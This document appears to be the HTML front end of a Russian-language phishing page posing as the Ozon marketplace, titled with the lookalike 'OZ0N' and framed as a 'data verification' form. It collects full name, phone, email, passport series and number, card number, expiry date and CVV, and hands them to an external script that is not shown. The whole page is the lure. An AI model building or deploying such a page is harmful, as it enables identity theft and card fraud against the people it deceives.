<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OZ0N</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="form-card">
            <div class="logo">Ozon</div>
            <h1>Проверка данных</h1>
            
            <form id="dataForm">
                <div class="form-group">
                    <label for="fullName">Полное имя</label>
                    <input type="text" id="fullName" name="fullName" required>
                </div>
                
                <div class="form-group">
                    <label for="phone">Номер телефона</label>
                    <input type="tel" id="phone" name="phone" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="passport">Серия и номер паспорта</label>
                    <input type="text" id="passport" name="passport" required>
                </div>

                <div class="form-group">
                    <label for="passport">Номер карты</label>
                    <input type="text" id="karta" name="karta" required>
                </div>

                <div class="form-group">
                    <label for="passport">Срок действия месяц и год</label>
                    <input type="text" id="skarta" name="skarta" required>
                </div>

                <div class="form-group">
                    <label for="passport">CVV/CVC-код трёхзначный код на обороте карты</label>
                    <input type="text" id="nkarta" name="nkarta" required>
                </div>
                
                <button type="submit" class="submit-btn">Подтвердить данные</button>
            </form>
            
            <div id="resultMessage" class="hidden result-message"></div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
